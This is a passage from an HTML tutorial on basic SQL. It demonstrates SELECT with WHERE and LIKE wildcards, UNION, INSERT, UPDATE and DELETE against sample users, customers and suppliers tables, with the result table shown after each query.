        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">admin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">p4ssword</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>This will only return the rows where the username is equal to&nbsp;<strong>admin</strong>, and the password is equal to&nbsp;<strong>p4ssword</strong>.</p>
<p>&nbsp;</p>
<p>Using the like clause allows you to specify data that isn't an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character represented by a percentage sign %.</p>
<p>&nbsp;</p>
<p><code>select * from users where username like 'a%';</code></p>
<p><br><br>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">admin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">p4ssword</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>This returns any rows with username beginning with the letter a.</p>
<p>&nbsp;</p>
<p><code>select * from users where username like '%n';</code></p>
<p><br><br>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">jon</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">pass123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">admin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">p4ssword</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">3</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">martin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">secret123</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>This returns any rows with username ending with the letter n.</p>
<p>&nbsp;</p>
<p><code>select * from users where username like '%mi%';</code></p>
<p><br><br>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">admin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">p4ssword</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>This returns any rows with a username containing the characters&nbsp;<strong>mi</strong>&nbsp;within them.</p>
<p><br><br>&nbsp;</p>
<p><strong>UNION</strong><br><br>&nbsp;</p>
<p>The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same. This might sound not very clear, so let's use the following analogy. Say a company wants to create a list of addresses for all customers and suppliers to post a new catalogue. We have one table called customers with the following contents:<br><br><br>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>name</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>address</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>city</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>postcode</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Mr John Smith</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">123 Fake Street</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Manchester</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">M2 3FJ</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Mrs Jenny Palmer</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">99 Green Road</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Birmingham</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">B2 4KL</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">3</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Miss Sarah Lewis</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">15 Fore Street</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">London</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">NW12 3GH</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>And another called suppliers with the following&nbsp;contents:</p>
<p><br><br>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>company</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>address</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>city</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>postcode</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Widgets Ltd</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Unit 1a, Newby Estate</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Bristol</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">BS19 4RT</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">The Tool Company</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">75 Industrial Road</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Norwich</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">N22 3DR</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">3</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Axe Makers Ltd</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">2b Makers Unit, Market Road</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">London</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">SE9 1KK</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>Using the following SQL&nbsp;Statement, we can gather the results from the two tables and put them into one result set:<br><br>&nbsp;</p>
<p><br><br>&nbsp;</p>
<p><code>SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;</code><br><br>&nbsp;</p>
<p><br><br>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>name</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>address</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>city</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>postcode</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Mr John Smith</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">123 Fake Street</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Manchester</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">M2 3FJ</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Mrs Jenny Palmer</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">99 Green Road</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Birmingham</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">B2 4KL</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Miss Sarah Lewis</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">15 Fore Street</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">London</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">NW12 3GH</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Widgets Ltd</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Unit 1a, Newby Estate</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Bristol</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">BS19 4RT</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">The Tool Company</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">75 Industrial Road</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Norwich</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">N22 3DR</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Axe Makers Ltd</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">2b Makers Unit, Market Road</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">London</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">SE9 1KK</td>
      </tr>
    </tbody>
  </table>
</figure>
<p>INSERT</p>
<p>The&nbsp;<strong>INSERT</strong>&nbsp;statement tells the database we wish to insert a new row of data into the table.&nbsp;<strong>"into users"</strong>&nbsp;tells the database which table we wish to insert the data into,&nbsp;<strong>"(username,password)"</strong>&nbsp;provides the columns we are providing data for and then&nbsp;<strong>"values ('bob','password');"</strong>&nbsp;provides the data for the previously specified columns.</p>
<p><br><br>&nbsp;</p>
<p><code>insert into users (username,password) values ('bob','password123');</code></p>
<p>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">jon</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">pass123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">admin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">p4ssword</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">3</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">martin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">secret123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">4</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">bob</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">password123</td>
      </tr>
    </tbody>
  </table>
</figure>
<p><strong>UPDATE</strong></p>
<p>The&nbsp;<strong>UPDATE</strong>&nbsp;statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "<strong>update %tablename% SET</strong>" and then select the field or fields you wish to update as a comma-separated list such as "<strong>username='root',password='pass123'</strong>" then finally similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "<strong>where username='admin;</strong>".</p>
<p>&nbsp;</p>
<p><code>update users SET username='root',password='pass123' where username='admin';</code></p>
<p>&nbsp;</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">jon</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">pass123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">root</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">pass123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">3</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">martin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">secret123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">4</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">bob</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">password123</td>
      </tr>
    </tbody>
  </table>
</figure>
<p><strong>DELETE</strong></p>
<p>The&nbsp;<strong>DELETE</strong>&nbsp;statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to be returned, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the&nbsp;<strong>where</strong>&nbsp;clause and the number of rows to be deleted using the&nbsp;<strong>LIMIT</strong>&nbsp;clause.</p>
<p><br><br>&nbsp;</p>
<p><code>delete from users where username='martin';</code></p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>id</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>username</strong></td>
        <td style="background-color:#1C2538;border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>password</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">1</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">jon</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">pass123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">2</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">root</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">pass123</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">4</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">bob</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">password123</td>
      </tr>
    </tbody>
  </table>
</figure>
